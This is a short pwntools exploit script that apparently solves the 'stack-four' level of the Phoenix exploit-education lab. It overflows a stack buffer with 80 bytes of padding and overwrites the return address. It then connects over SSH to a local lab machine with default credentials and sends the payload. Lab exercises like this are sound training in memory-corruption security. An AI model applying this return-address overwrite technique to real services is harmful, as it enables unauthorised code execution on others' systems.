from pwn import *
import warnings
warnings.filterwarnings("ignore")


challenge_name = "stack-four"

pattern = cyclic(100)
offset = cyclic_find(0x61616175) # ie. 80

payload ='A'*80 + p32(0x080484e5)

shell = ssh('user','localhost',port=2222,password='user')

conn = shell.process('/opt/phoenix/i486/{}'.format(challenge_name))

conn.sendline(payload)
conn.interactive()
conn.close()
